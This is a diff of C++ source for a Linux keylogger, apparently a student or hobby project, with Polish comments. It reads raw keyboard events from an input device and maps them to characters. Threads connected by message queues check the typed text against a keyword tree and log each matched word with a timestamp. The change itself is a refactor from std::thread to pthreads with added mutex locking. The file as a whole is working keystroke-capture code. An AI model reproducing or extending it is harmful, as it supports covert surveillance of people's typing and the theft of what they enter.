@@ -15,22 +15,32 @@
 #include <iostream>
 #include <sstream>
 #include <fstream>
-#include "tree.h"
-#include "treecheck.h"
 #include <vector>
 #include <mqueue.h>
-#include <mutex>
 #include <list>
-#include <thread>
+#include <pthread.h>
+
+#include "tree.h"
+#include "treecheck.h"
 #include "ninja/ninja.h"
 
-std::mutex mutex;
+pthread_mutex_t mutex;
 
+//tablica znaków
 const char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
 					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
 					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
 					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
 					 'b','n','m',',','.','/' };
+
+//struktura argumentów do funkcji runChecker
+struct CheckerArgs
+{
+    CheckerArgs(const std::string &p, Tree &t, const std::string &n) : tree(t), name(n), logPath(p) {}
+    std::string name;
+    std::string logPath;
+    Tree &tree;
+};
 
 void handler (int sig)
 {
@@ -42,9 +52,10 @@ void perror_exit()
   handler(9);
 }
 
-
+//metoda inicjująca keyLoggera oraz uruchamiająca sendera znaków
 void init();
-void runChecker(const std::string &logPath, Tree &tree, const std::string &name);
+//metoda odpowiedzialna za sprawdzanie słowa kluczowego w drzewie
+void *runChecker(void *args);
 
 int main (int argc, char **argv)
 {
@@ -60,7 +71,7 @@ int main (int argc, char **argv)
 
 }
 
-void loadData(std::string &eventPath, std::string &logPath, std::vector<std::string> *slowa) 
+void loadData(std::string &eventPath, std::string &logPath, std::vector<std::string> *slowa)
 {
 
 	std::ifstream stream;
@@ -83,6 +94,7 @@ void loadData(std::string &eventPath, std::string &logPath, std::vector<std::str
 
 }
 
+//drukowanie czasu to pliku (potrzebne przy wystąpieniu słowa kluczowego)
 void printTime(FILE *data)
 {
 	time_t now;
@@ -97,7 +109,7 @@ void printTime(FILE *data)
 	free(t);
 }
 
-void init() 
+void init()
 {
 	struct input_event ev[1];
 	int fd, rd, value, size = sizeof(struct input_event);
@@ -109,7 +121,13 @@ void init()
 
 
 	Tree tree(slowa);
-	//TreeCheck checker(&tree);
+
+
+    if(pthread_mutex_init(&mutex,NULL) == -1)
+	{
+        printf ("pthread_mutex_init ERROR\n");
+        exit(1);
+    }
 
 	//Open Device
 	if ((fd = open (eventPath.c_str(), O_RDONLY)) == -1)
@@ -147,7 +165,7 @@ void init()
             attrib.mq_maxmsg = 4;     //maksymalna ilość wiadomości w kolejce
             attrib.mq_msgsize = 8;   //wielkość 1 wiadomości
 
-
+            //otworzenie nowej kolejki
             const mqd_t id = mq_open(qname.c_str(), O_CREAT | O_WRONLY, 0644, &attrib);
 
                 if(id != -1)
@@ -157,13 +175,20 @@ void init()
                 }
                 else
                 {
+                    pthread_mutex_lock(&mutex);
                     fprintf(data,"%s QUEUE OPEN ERROR (SENDER)\n",qname.c_str());
+                    fflush(data);
+                    pthread_mutex_unlock(&mutex);
                     return;
                 }
 
             //tworzenie nowego wątku dla kolejnej literki
-            std::thread newThread(std::bind(runChecker,logPath,tree,qname));
-            newThread.detach();
+            CheckerArgs *arguments = new CheckerArgs(logPath,tree,qname);
+
+            //uruchomienie wątku Chekecra
+            pthread_t newThread;
+            pthread_create(&newThread, 0, runChecker, (void*)arguments);
+            pthread_detach(newThread);
 
             if(!queueList.empty())
 			{
@@ -177,15 +202,16 @@ void init()
                     std::string msg = "";
                     msg += chars[value];
 
+                    //sprawdzenie czy kolejka nadal istnieje
                     if( check != NULL)
                     {
-                       // fprintf(data, "%s : %s\n",(*itN).c_str(), msg.c_str());
-                       // fflush(data);
 
                         if(mq_send(*it, msg.c_str(),sizeof(msg.c_str()), 0) == -1)
                         {
+                            pthread_mutex_lock(&mutex);
                             fprintf(data, "%s QUEUE SEND ERROR\n",(*itN).c_str());
                             fflush(data);
+                            pthread_mutex_unlock(&mutex);
                         }
                         it++;
                         itN++;
@@ -205,19 +231,22 @@ void init()
 
 
 
-void runChecker(const std::string &logPath,Tree &tree,const std::string &name)
+void *runChecker(void *args)
 {
-    TreeCheck checker(&tree);
+    CheckerArgs *arguments = (CheckerArgs*)args;
+    FILE *file = fopen(arguments->logPath.c_str(),"a+");
 
-    FILE *file = fopen(logPath.c_str(),"a+");
+    TreeCheck checker(&(arguments->tree));
 
     //metoda tworzaca kolejkę
-    const int id = mq_open(name.c_str(),O_RDONLY);
+    const int id = mq_open(arguments->name.c_str(),O_RDONLY);
     if(id==-1)
     {
-        fprintf(file, "%s QUEUE OPEN ERROR\n",name.c_str());
+        pthread_mutex_lock(&mutex);
+        fprintf(file, "%s QUEUE OPEN ERROR\n",arguments->name.c_str());
         fflush(file);
-        return;
+        pthread_mutex_unlock(&mutex);
+        exit(1);
     }
 
     while(1)
@@ -230,21 +259,23 @@ void runChecker(const std::string &logPath,Tree &tree,const std::string &name)
 
         if(id==-1)
         {
-            fprintf(file, "%s QUEUE RECEIVE ERROR\n",name.c_str());
+            pthread_mutex_lock(&mutex);
+            fprintf(file, "%s QUEUE RECEIVE ERROR\n",arguments->name.c_str());
             fflush(file);
-            return;
+            pthread_mutex_unlock(&mutex);
+            break;
         }
-
+        //czy litera jest kolejnym liściem drzewa
         if(checker.checkNextLetter(buff[0]))
         {
-
+                //znaleziono słowo
                 if(checker.isCurrentNodeTerminal())
                 {
-                    mutex.lock();
+                    pthread_mutex_lock(&mutex);
                     printTime(file);
                     fprintf(file, "%s\n", checker.getFoundWord().c_str());
                     fflush(file);
-                    mutex.unlock();
+                    pthread_mutex_unlock(&mutex);
 
                 }
         }
@@ -253,20 +284,24 @@ void runChecker(const std::string &logPath,Tree &tree,const std::string &name)
                     int close = mq_close(id);   //zamykanie kolejki
                     if(close != 0)
                     {
-                        fprintf(file, "%s QUEUE CLOSE ERROR\n",name.c_str());
+                        pthread_mutex_lock(&mutex);
+                        fprintf(file, "%s QUEUE CLOSE ERROR\n",arguments->name.c_str());
                         fflush(file);
-                        return;
+                        pthread_mutex_unlock(&mutex);
+                        exit(1);
                     }
 
-                    close = mq_unlink(name.c_str());    //odłączanie kolejki
+                    close = mq_unlink(arguments->name.c_str());    //odłączanie kolejki
 
                     if(close != 0)
                     {
-                            fprintf(file, "%s QUEUE UNLINK ERROR\n",name.c_str());
+                            pthread_mutex_lock(&mutex);
+                            fprintf(file, "%s QUEUE UNLINK ERROR\n",arguments->name.c_str());
                             fflush(file);
-                            return;
+                            pthread_mutex_unlock(&mutex);
+                            exit(1);
                     }
-                    return;
+                    break;
         }
     }
 }
